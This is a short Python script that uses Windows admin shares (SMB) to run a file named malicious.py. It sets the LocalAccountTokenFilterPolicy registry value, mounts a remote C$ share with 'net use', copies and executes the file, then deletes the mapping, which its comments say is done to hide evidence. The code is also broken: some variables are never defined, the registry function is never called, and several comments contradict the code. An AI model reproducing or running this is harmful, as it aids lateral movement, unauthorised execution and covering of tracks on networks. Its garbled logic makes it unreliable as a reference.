# This script takes advantage of potential weaknessess in the SMB protocol to execute files in network-shared folders.

import os,winreg,shutil

def enableAdminShare(computerName):
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    winreg.ConnectRegistry(computerName,winreg.HKEY_LOCAL_MACHINE)
    winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
    winreg.SetValueEx(key,"LocalAccountTokenFilterPolicy",0,winreg.REG_DWORD,1)
# HLMK + regpath + LocalAccountToeknFilterPolicy is the PATH + key that determines if fileshares are accessible on a Windows PC.
# So this function accesses and opens write access the Windows Registry, enabling fileshares.
# Reboot would be necessary to implement this script if fileshares were not enabled. 

def accessAdminShare(computerName,executable):
# This script though is a locally shared fileshare inside the C directory.
    remote = r"\\"+computerName+"\c$"
    # The "r" means raw, and is there so double-backslashing is not necessary when Windows parses the command.
    local = "Z:"
    remotefile = local + "\\"+executable
    # Maps the malicious executable to Z drive.
    os.system("net use "+local+" "+remote)
    # Mounts the Z drive to shareable C drive.
    shutil.move(executable,remotefile)
    # Moves the malicious file from Z to C.
    os.system("python "+remotefile)
    # Runs the malicious executeable on the local machine.
    os.system("net use "+local+" /delete")
    # Deletes Z from C to hide evidence.

accessAdminShare(os.environ["COMPUTERNAME"],r"malicious.py")
